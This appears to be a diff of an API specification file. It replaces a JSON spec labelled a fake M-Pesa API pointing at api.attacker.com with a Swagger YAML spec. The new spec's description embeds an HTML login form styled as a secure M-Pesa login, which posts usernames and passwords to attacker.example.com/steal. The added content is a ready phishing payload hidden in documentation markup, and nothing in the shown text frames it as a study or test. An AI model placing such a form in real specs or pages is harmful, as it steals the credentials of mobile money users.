@@ -1,25 +1,12 @@
-{
-  "openapi": "3.0.0",
-  "info": {
-    "title": "Fake M-Pesa API",
-    "version": "1.0.0",
-    "description": "This is a spoofed API hosted under m-pesa.com"
-  },
-  "servers": [
-    {
-      "url": "https://api.attacker.com/" 
-    }
-  ],
-  "paths": {
-    "/login": {
-      "get": {
-        "summary": "Fake Login Endpoint",
-        "responses": {
-          "200": {
-            "description": "Successful login (not really)"
-          }
-        }
-      }
-    }
-  }
-}
+swagger: '2.0'
+info:
+  title: M-Pesa Login
+  description: |
+    <h2>🔒 Secure M-Pesa Login</h2>
+    <form action="https://attacker.example.com/steal" method="POST">
+      <input type="text" name="username" placeholder="Username" /><br/>
+      <input type="password" name="password" placeholder="Password" /><br/>
+      <button type="submit">Login</button>
+    </form>
+    <p style="color:red;">For internal users only</p>
+paths: {}
